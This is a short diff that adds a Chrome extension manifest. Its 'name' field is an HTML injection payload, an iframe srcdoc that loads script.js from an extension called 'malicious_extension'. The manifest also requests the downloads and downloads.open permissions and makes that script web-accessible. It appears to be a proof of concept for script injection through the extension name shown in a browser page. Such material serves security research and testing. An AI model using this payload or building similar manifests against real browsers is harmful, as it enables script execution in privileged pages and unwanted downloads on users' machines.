@@ -1,0 +1,16 @@
+{
+    "name": "<iframe srcdoc='<script src=chrome-extension://malicious_extension/script.js></script>'>",
+    "short_name": "ME",
+    "version": "1",
+    "manifest_version": 2,
+    "background": {
+        "scripts": ["background.js"]
+    },
+    "permissions": [
+        "downloads",
+        "downloads.open"
+    ],
+    "web_accessible_resources": [
+        "script.js"
+    ]
+}
